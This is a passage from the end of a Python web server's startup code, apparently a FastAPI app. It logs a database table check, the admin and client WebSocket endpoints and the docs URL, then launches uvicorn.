            """)
            tables = cursor.fetchall()
            logger.info(f"✅ Tables found: {[t['table_name'] for t in tables]}")
            
            cursor.close()
            db_conn.close()
        except Exception as e:
            logger.error(f"❌ Database test failed: {e}")
    else:
        logger.error("❌ Database connection failed - Check your DATABASE_URL environment variable")
    
    logger.info(f"🔗 WebSocket endpoints:")
    logger.info(f"   • Admin: ws://localhost:{PORT}/ws/admin")
    logger.info(f"   • Client: ws://localhost:{PORT}/ws/client/{{client_id}}")
    logger.info(f"📚 Documentation: http://localhost:{PORT}/docs")
    logger.info("✅ Application startup complete")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(
        "main:app",
        host="0.0.0.0",
        port=PORT,
        log_level="info",
        access_log=True
    )
